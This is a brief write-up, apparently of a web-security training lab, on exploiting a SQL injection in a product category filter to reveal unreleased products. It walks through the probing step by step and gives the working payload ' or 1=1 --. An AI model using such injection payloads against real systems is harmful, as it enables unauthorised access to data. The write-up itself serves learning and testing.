# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Given:

- vulnerability in product category filter

- query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1

### Task:
- perform SQLi attact to display one or more unreleased products.

### Analysis:
- SELECT * FROM products WHERE category = 'Accessories' AND released = 1

- SELECT * FROM products WHERE category = ''' AND released = 1
    - internal server error(500 response code)

- SELECT * FROM products WHERE category = ''--' AND released = 1 
    - SELECT * FROM products WHERE category = '' => No error(200 response code)

- SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
    - SELECT * FROM products WHERE category = '' or 1=1 
    - task completed, unreleased product displayed.